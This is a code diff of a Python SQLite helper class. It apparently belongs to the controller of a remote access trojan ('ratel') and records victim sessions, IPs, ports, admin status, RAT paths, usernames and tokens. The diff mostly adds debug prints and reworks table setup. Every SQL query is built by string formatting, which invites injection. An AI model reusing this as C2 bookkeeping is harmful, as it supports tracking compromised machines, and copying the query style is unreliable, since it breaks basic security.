@@ -10,28 +10,38 @@ sqlite3
 class Sql:
     
     def __init__(self,name_db, name_file_table, name_table):
-        self.name_db = name_db
+        print("CONSTRUCTOR: \n\n")
+        self.name_db = name_db 
         self.name_file_table = name_file_table #The ratel table file name
         self.name_table = name_table
-        self.conn = self.setConnection()
-        self.cursor = self.setCursor()
+        print("name: ", name_db)
+        print("name file table: ", name_file_table)
+        print("Name table: ", name_table)
+        self.conn = self.setConnection() #self.setConnection()
+        self.cursor = self.setCursor() # self.setCursor()
+        self.setDB()
 
     def setConnection(self):
     #create a database connection to a SQLite database 
         conn = None
         try:
+            print(self.name_db)
             conn = sqlite3.connect(self.name_db, check_same_thread=False) #https://stackoverflow.com/questions/48218065/programmingerror-sqlite-objects-created-in-a-thread-can-only-be-used-in-that-sa/60902437
+            print(conn)
         except sqlite3.Error as e:
-            print(e)
+            print("setConnection: ",e)
         finally:
             return conn
 
+
     def setCursor(self):
+        cursor = None
         if not(self.conn):
             print("[-] The cursor cannot create.")
         else:
             #print("[+] Cursor ok.")
-            return self.conn.cursor()
+            cursor = self.conn.cursor()
+            return cursor
 
 
     def closeConn(self):
@@ -63,8 +73,8 @@ class Sql:
     
 
     def execSqlCode(self,sql_code, commit=False, display=False):
+
         try:
-            #print(sql_code)
             self.cursor.execute(sql_code)
             if(display):
                 print(self.cursor.fetchone())
@@ -78,6 +88,7 @@ class Sql:
             else:
                 pass
 
+
     def selectAll(self):
         list_of_rows = []
         '''
@@ -85,14 +96,17 @@ class Sql:
         each row in the database and store in a tuple.
         '''        
         try:
+            print("""SELECT * FROM {}""".format(self.name_table))
+
             self.cursor.execute("""SELECT * FROM {}""".format(self.name_table))
             rows = self.cursor.fetchall()
             
             for row in rows: #row = tuple
                 list_of_rows.append(row)
+                print(row)
 
         except sqlite3.Error as e:
-            print("Error in execSqlCode: ",e)
+            print("Error in selectAll ",e)
         finally:        
             #print("commit ok")
             self.conn.commit()
@@ -101,9 +115,8 @@ class Sql:
 
 
     def insertInDatabase(self, session, ip, port, is_he_alive, is_he_admin, path_RAT, username, token):
-        #print("""INSERT INTO {}(session, ip, port, is_he_alive, is_he_admin, path_RAT, username, token) VALUES({},"{}","{}","{}","{}","{}","{}","{}") """.format(self.name_table, session ,ip, port, is_he_alive, is_he_admin, path_RAT, username, token))
-        #print("""INSERT INTO {}(session, ip, port, is_he_alive, is_he_admin, path_RAT, username, token) VALUES({},"{}",{},"{}","{}","{}","{}","{}")""".format(self.name_table, session ,ip, port, is_he_alive, is_he_admin, path_RAT, username, token))
-        self.execSqlCode("""INSERT INTO {}(session, ip, port, is_he_alive, is_he_admin, path_RAT, username, token) VALUES({},"{}",{},"{}","{}","{}","{}","{}")""".format(self.name_table, session ,ip, port, is_he_alive, is_he_admin, path_RAT, username, token),True)
+        #https://stackoverflow.com/questions/35415469/sqlite3-unique-constraint-failed-error ERROR WINDOWS
+        self.execSqlCode("""INSERT or REPLACE INTO {}(session, ip, port, is_he_alive, is_he_admin, path_RAT, username, token) VALUES({},"{}",{},"{}","{}","{}","{}","{}")""".format(self.name_table, session ,ip, port, is_he_alive, is_he_admin, path_RAT, username, token),True)
         #print("[+] Insert in database ok.")       
         
 
@@ -119,19 +132,21 @@ class Sql:
 
     
     def returnValue(self, session, column): 
+        '''returns a value in the db.'''
         row = ""
         try:
             #print("""SELECT {} FROM {} WHERE session = {} """.format(column, self.name_table ,session))
             self.cursor.execute("""SELECT {} FROM {} WHERE session = {} """.format(column, self.name_table ,int(session) ))
             row = self.cursor.fetchone()  #return tuple
-            print(row)
+           # print(row)
         except sqlite3.Error as e:
-            print("Error in execSqlCode: ",e)
+            print("Error in returnValue: ",e)
         finally:
             self.conn.commit()
             return str(row[0])
     
     def returnLastSession(self):
+        '''returns the last session.'''
         try:
             self.cursor.execute("""SELECT MAX(session) FROM {}""".format(self.name_table))
             row = self.cursor.fetchone()  #return tuple
@@ -139,21 +154,18 @@ class Sql:
         #    print("-->",type(row),len(row))
         
         except sqlite3.Error as e:
-            print("Error in execSqlCode: ",e)
+            print("Error in returnLastSession: ",e)
         finally:
             self.conn.commit()
             return int(row[0])
 
-    def createDb(self):
-        self.execSqlCode(self.readFile(self.name_file_table)) #Create table if no exists
 
-    def removeDatabase(self):
-        
-        try:
-            os.remove(self.name_db)   
-        except Exception as e:
-            print(e)
-        
+    def setDB(self):
+        '''insert code sql for create table ratel.'''
+        print("steDB gooo: ")
+        self.execSqlCode(self.readFile(self.name_file_table),True) #Create table if no exists
+ 
+
     def setTrueOrFalse(self,data):
         #Convert a string from the database to Boolean
         if("False" in data):
@@ -162,26 +174,6 @@ class Sql:
             return True
         else:
             return data
-
-    def main(self):
-        if(self.checkFileExists(self.name_db)):
-
-            #print("[+] The database has been found.")
-            #self.insertInDatabase(4,"127.0.0.1",8888 ,1 ,1 , "C:", "cisco", "01010101")
-            #self.insertInDatabase(6,"8.8.8.6666",77978 ,1 ,1 , "C:", "roms", "01010101")
-
-            self.execSqlCode("SELECT * FROM table_ratel",False,True)
-
-            #self.updateValue("ip","tamer",1,True)
-            self.execSqlCode("SELECT * FROM table_ratel",False,True)
-
-            #self.execSqlCode("""INSERT INTO tables_ratel(session,ip,port,is_he_alive,is_he_admin,path_RAT,username,token) VALUES(1,"8888","127.0.0.1", 1 ,0 , "C:", "cisco", "01010101");
-            #self.removeDatabase()
-        else:
-            print("[-] The database is probably not found. ")
-        #self.removeDatabase()
-        self.closeConn()
-
 
     
 #INSERT INTO tables_ratel(session,ip,port,is_he_alive,is_he_admin,path_RAT,username,token) VALUES(1,"8888","127.0.0.1", 1 ,0 , "C:", "cisco", "01010101");
